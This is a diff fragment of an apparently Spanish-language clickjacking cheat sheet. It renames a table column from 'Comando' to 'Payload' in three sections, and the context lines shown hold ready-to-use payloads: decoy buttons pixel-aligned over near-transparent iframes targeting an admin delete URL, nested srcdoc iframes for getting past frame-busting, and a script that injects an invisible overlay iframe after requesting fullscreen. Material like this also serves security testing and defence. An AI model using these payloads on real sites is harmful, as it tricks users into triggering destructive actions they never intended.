@@ -86,7 +86,7 @@ linked:
 
 ## Decoy Button Placement
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | Burp Repeater → request target page → identify button via DevTools Inspector → note x/y/dimensions | Recon button precise position | Pre-attack recon. |
 | `<button style="position:absolute;top:280px;left:240px;width:120px;height:48px;z-index:1">CLAIM NOW</button><iframe src="https://target.com/admin/delete" style="position:absolute;top:280px;left:240px;width:120px;height:48px;opacity:0.0001;z-index:9999"></iframe>` | Pixel-aligned decoy + iframe overlay | Precision target. |
@@ -105,7 +105,7 @@ linked:
 
 ## Double Iframe
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<iframe srcdoc='<iframe src=https://target.com/admin/x style=opacity:0.0001;width:100%;height:100%></iframe>' style="width:100%;height:100vh"></iframe>` | srcdoc nested iframe bypass | Frame-busting bypass. |
 | `<iframe srcdoc='<iframe src=https://target.com/x style=opacity:0.0001></iframe><button style=position:absolute;top:300px;left:200px;z-index:1>Click</button>' style="width:100vw;height:100vh"></iframe>` | Outer srcdoc + inner victim + decoy | Compound nesting. |
@@ -135,7 +135,7 @@ linked:
 
 ## Fullscreen Mode Abuse
 
-| **Comando** | **Qué obtenés** | **Cuándo** |
+| **Payload** | **Qué obtenés** | **Cuándo** |
 |:---:|:---:|:---:|
 | `<button onclick="document.documentElement.requestFullscreen()">Play Game</button>` luego JS overlays iframe on fullscreen | Fullscreen + post-FS overlay | UX confusion. |
 | `<button onclick="fs()">Start</button><script>function fs(){document.documentElement.requestFullscreen().then(()=>{const i=document.createElement('iframe');i.src='https://target.com/admin/x';i.style.cssText='position:fixed;top:0;left:0;width:100vw;height:100vh;opacity:0.0001;z-index:9999';document.body.appendChild(i)})}</script>` | Auto inject iframe post-fullscreen | Fullscreen auto-overlay. |
